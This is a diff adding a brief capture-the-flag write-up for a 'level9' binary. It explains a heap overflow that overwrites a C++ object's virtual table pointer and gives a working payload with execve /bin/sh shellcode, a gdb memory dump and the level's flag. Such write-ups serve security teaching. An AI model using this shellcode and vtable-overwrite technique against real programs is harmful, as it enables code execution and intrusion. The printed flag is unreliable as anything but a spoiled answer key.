@@ -1,0 +1,26 @@
+This program is a C++ binary. It instantiate 2 objects called N.
+The class N which have a buffer (0x64) and an int variable use two virtual methods to overload the operators '+' and '-'. N have another method called 'setAnnotation'. This function copy the string argument into N's buffer.
+Since this class use a virtual table to overload the operators and copy the string without checking the length, we can use a buffer overlflow to rewrite the address of the virtual table.
+In fact, the program use setAnnotation on the first object N and use the operator '+' with the 2 objects N. We can use setAnnotation (use on the first N) to rewrite the address of the virtual table of the second object N. 
+We can use this payload:
+
+export SHELLCODE=`python -c 'print ("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'`
+./level9 `python -c 'print (0x68 * "a" + "\xff\xff\xfe\xbf" + "\x74\xa0\x04\x08")'`
+
+The flag is f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+gdb$ x/70x 0x0804a008
+0x804a008:	0x08048848(virtual table)	0x00000000(buffer until var1)	0x00000000	0x00000000
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a068:	0x00000000	0x00000000	0x00000005(var1)	0x00000071
+0x804a078:	0x08048848(virtual table)	0x00000000(buffer until var1)	0x00000000	0x00000000
+0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0d8:	0x00000000	0x00000000	0x00000006(var1)	0x00020f21
